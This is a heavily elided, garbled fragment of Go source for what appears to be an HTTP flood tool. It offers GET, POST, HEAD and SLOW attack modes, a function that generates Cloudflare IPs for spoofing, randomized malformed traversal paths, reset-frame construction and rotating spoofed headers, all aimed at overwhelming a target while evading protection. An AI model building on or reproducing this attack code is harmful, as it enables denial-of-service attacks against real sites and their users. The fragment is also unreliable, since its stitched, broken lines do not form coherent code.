...
var (
	...
	// ADDED: Application headers	appHeaders = []map[string]string{
		...
		default:
			...
			for i := 0; i < 50; i++ {
				...
				default:
					...
					resetFrame[9] = 0					resetFrame[10] = 0
					resetFrame[11] = 0
...
// ADDED: Generate Cloudflare IP for spoofingfunc generateCloudflareIP() string {
...
func generateAdvancedPath() string {
	...
	if randInt(1, 100) <= 20 {
		malforms := []string{
			"/" + randomString(4) + "/../" + randomString(4),			"/./" + randomString(6) + "/..",
			"//" + randomString(8),
...
func main() {
	...
	if mode != "GET" && mode != "POST" && mode != "HEAD" && mode != "SLOW" {
		printBanner()
		fmt.Println("Mode GET, POST, HEAD, and SLOW ")		os.Exit(1)
	}

	// === MODIFIED: Handle pure IP addresses ===
	var u *url.URL
	var err error
	...
	if err != nil || u.Scheme == "" || u.Host == "" {
		// Not a valid URL, check if it's an IP address (with optional port)
		hostPort := target
		if strings.Contains(target, ":") && !strings.Contains(target, "://") {
			...
			// Single part, check if it's an IP
			if net.ParseIP(target) != nil {
				hostPort = target
			} else {
				hostPort = target
	...
	for {
		...
		default:
			...
			if provider == "cloudflare" || randInt(1, 100) <= 40 {
				...
				numCF := randInt(2, 4)
				for i := 0; i < numCF; i++ {					cfHeader := cloudflareHeaders[randInt(0, len(cloudflareHeaders)-1)]
